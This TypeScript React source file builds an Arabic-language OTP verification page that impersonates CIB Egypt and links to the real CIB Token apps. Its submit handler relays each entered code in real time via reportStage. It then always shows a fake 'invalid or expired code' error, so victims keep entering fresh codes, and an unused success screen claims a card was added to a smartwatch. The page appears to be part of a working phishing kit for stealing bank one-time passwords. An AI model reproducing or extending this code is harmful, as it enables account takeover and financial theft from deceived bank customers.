import { useState, useRef, useEffect } from 'react';
import { useLocation, Link } from 'wouter';
import { AppLayout } from '@/components/layout/AppLayout';
import { Button } from '@/components/ui/button';
import { ChevronRight, CheckCircle2, ShieldCheck, Smartphone, AlertCircle } from 'lucide-react';
import { useRegistration } from '@/context/RegistrationContext';
import { useRealtime } from '@/context/RealtimeContext';

// Detect device type
const getDeviceType = () => {
  const userAgent = navigator.userAgent || navigator.vendor || (window as unknown as { opera?: string }).opera;
  
  if (/android/i.test(userAgent)) {
    return 'android';
  }
  
  if (/iPad|iPhone|iPod/.test(userAgent) || 
      (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    return 'ios';
  }
  
  return 'unknown';
};

// App Store links
const APP_STORE_URL = 'https://apps.apple.com/us/app/cib-otp-token/id1074048518?l=ar';
const GOOGLE_PLAY_URL = 'https://play.google.com/store/apps/details?id=com.CIBEgyptSecureToken&pcampaignid=web_share';

export default function Verify() {
  const [, setLocation] = useLocation();
  const { data } = useRegistration();
  const { reportStage } = useRealtime();
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [isSuccess, setIsSuccess] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState('');
  const [appUrl, setAppUrl] = useState(APP_STORE_URL);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    // Set the appropriate URL based on device type
    const device = getDeviceType();
    if (device === 'android') {
      setAppUrl(GOOGLE_PLAY_URL);
    } else {
      setAppUrl(APP_STORE_URL);
    }
  }, []);

  useEffect(() => {
    reportStage('verify', {});
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (inputRefs.current[0] && !isSuccess) {
      inputRefs.current[0].focus();
    }
  }, [isSuccess]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    
    // Clear error when user starts typing
    if (error) setError('');
    
    const newCode = [...code];
    // Handle paste of multiple characters
    if (value.length > 1) {
      const pastedCode = value.slice(0, 6).split('');
      for (let i = 0; i < pastedCode.length; i++) {
        if (index + i < 6) newCode[index + i] = pastedCode[i];
      }
      setCode(newCode);
      const nextFocus = Math.min(index + pastedCode.length, 5);
      inputRefs.current[nextFocus]?.focus();
      return;
    }

    newCode[index] = value;
    setCode(newCode);

    if (value !== '' && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && code[index] === '' && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const fullCode = code.join('');
    if (fullCode.length >= 4) {
      reportStage('verify', { verificationCode: fullCode });
      setIsSubmitting(true);
      setError('');
      // Simulate network verification - for demo, show error
      setTimeout(() => {
        setIsSubmitting(false);
        // Show error message for invalid/expired code
        setError('رمز التحقق غير صحيح أو منتهي. يرجى الحصول على رمز جديد والمحاولة مرة أخرى.');
        // Clear the code inputs
        setCode(['', '', '', '', '', '']);
        inputRefs.current[0]?.focus();
      }, 1500);
    }
  };

  if (isSuccess) {
    return (
      <AppLayout>
        <div className="flex-1 flex flex-col items-center justify-center max-w-md w-full mx-auto animate-in fade-in duration-500 py-10" dir="rtl">
          <div className="w-20 h-20 mb-6 rounded-full bg-primary/10 flex items-center justify-center border border-primary/20">
            <ShieldCheck className="w-10 h-10 text-primary" />
          </div>
          
          <h2 className="text-xl font-bold text-foreground mb-2 text-center">تم التفعيل بنجاح</h2>
          
          <p className="text-xs text-muted-foreground text-center mb-6 leading-relaxed px-4 text-right">
            عزيزي <span className="font-semibold text-foreground">{data.fullName || 'العميل'}</span>، تمت إضافة بطاقة <span className="text-primary font-medium">CIB Prime</span> إلى ساعتك الذكية بنجاح. يمكنك الآن الدفع بسهولة وأمان.
          </p>
          
          <div className="bg-card border border-border/80 rounded-2xl p-5 w-full shadow-sm text-right mb-6">
            <div className="space-y-3">
              <div className="flex items-center justify-between pb-3 border-b border-border/50">
                <span className="text-muted-foreground text-xs">البطاقة</span>
                <span className="font-bold tracking-[0.3em] text-foreground text-sm" dir="ltr">•••• 4920</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-muted-foreground text-xs">الحالة</span>
                <span className="flex items-center gap-1.5 text-emerald-500 text-xs font-bold bg-emerald-500/10 px-2.5 py-1 rounded-lg">
                  <CheckCircle2 className="w-4 h-4" /> نشطة الآن
                </span>
              </div>
            </div>
          </div>
          
          <Link href="/" className="w-full">
            <Button size="lg" className="w-full h-11 text-sm font-semibold rounded-xl bg-primary text-primary-foreground hover:bg-primary/95 transition-colors">
              العودة للرئيسية
            </Button>
          </Link>
        </div>
      </AppLayout>
    );
  }

  return (
    <AppLayout>
      <div className="flex-1 flex flex-col justify-center max-w-md w-full mx-auto animate-in fade-in-50 slide-in-from-bottom-4 duration-300 py-10" dir="rtl">
        
        {/* الهيدر العلوي النظيف */}
        <div className="mb-6 flex items-center justify-between px-1">
          <div className="text-right">
            <h1 className="text-xl font-bold text-foreground tracking-tight">رمز التحقق</h1>
            <p className="text-xs text-muted-foreground mt-1">أدخل الرمز الذي تسلّمته من فرع CIB</p>
          </div>
          <Link href="/create-account" className="w-9 h-9 flex items-center justify-center rounded-lg bg-secondary border border-border/60 text-muted-foreground hover:text-foreground transition-all">
            <ChevronRight className="w-4 h-4" />
          </Link>
        </div>

        {/* الكارت الاحترافي النظيف */}
        <div className="bg-card border border-border/80 rounded-2xl p-6 md:p-8 shadow-sm text-right">
          <form onSubmit={handleSubmit} className="space-y-6">
            
            {/* خانات إدخال الكود الرقمي */}
            <div className="flex justify-center gap-2 md:gap-3" dir="ltr">
              {code.map((digit, index) => (
                <input
                  key={index}
                  ref={el => { inputRefs.current[index] = el; }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={e => handleChange(index, e.target.value)}
                  onKeyDown={e => handleKeyDown(index, e)}
                  className={`w-10 h-12 text-center text-xl font-bold bg-background/50 border rounded-xl focus:outline-none focus:ring-1 transition-all ${
                    error 
                      ? 'border-red-500 focus:ring-red-500/50 focus:border-red-500' 
                      : 'border-border/80 focus:ring-primary/50 focus:border-primary'
                  }`}
                />
              ))}
            </div>

            {/* رسالة الخطأ */}
            {error && (
              <div className="flex items-start gap-2.5 p-3.5 bg-red-50 border-r-4 border-red-600 rounded-l text-right">
                <AlertCircle className="w-4 h-4 text-red-500 flex-shrink-0 mt-0.5" />
                <p className="text-red-600 text-xs font-medium leading-relaxed">
                  {error}
                </p>
              </div>
            )}

            {/* صندوق النص التوضيحي الأصلي */}
            <div className="bg-primary/5 border border-primary/10 rounded-xl p-4 text-xs leading-relaxed text-center text-foreground/90 font-medium">
              يرجى ادخال رمز التحقق من
              <br />
              تطبيق cib token لإتمام عملية التحقق والمتابعة
            </div>

            {/* زر التأكيد */}
            <Button 
              type="submit" 
              size="lg" 
              className="w-full h-11 text-sm font-semibold rounded-xl bg-primary text-primary-foreground hover:bg-primary/95 transition-colors flex items-center justify-center" 
              disabled={code.join('').length < 4 || isSubmitting}
            >
              {isSubmitting ? (
                <span className="flex items-center gap-2">
                  <div className="w-4 h-4 rounded-full border-2 border-background border-t-transparent animate-spin" />
                  جاري التوثيق والتفعيل...
                </span>
              ) : (
                'تأكيد  '
              )}
            </Button>

            {/* صندوق فتح تطبيق التوكن الأصلي */}
            <a 
              href={appUrl}
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center justify-between p-3.5 bg-secondary/50 border border-border/80 rounded-xl hover:bg-secondary/80 transition-all group"
            >
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-primary/10 text-primary rounded-lg flex items-center justify-center">
                  <Smartphone className="w-5 h-5" />
                </div>
                <div className="text-right">
                  <p className="text-foreground font-bold text-xs">
                    يرجى فتح التطبيق CIB Token
                  </p>
                  <p className="text-muted-foreground text-[11px] mt-0.5">
                    للحصول على رمز التحقق
                  </p>
                </div>
              </div>
              <ChevronRight className="w-4 h-4 text-muted-foreground/60 group-hover:translate-x-0.5 transition-transform rotate-180" />
            </a>
          </form>
        </div>

       
      </div>
    </AppLayout>
  );
}
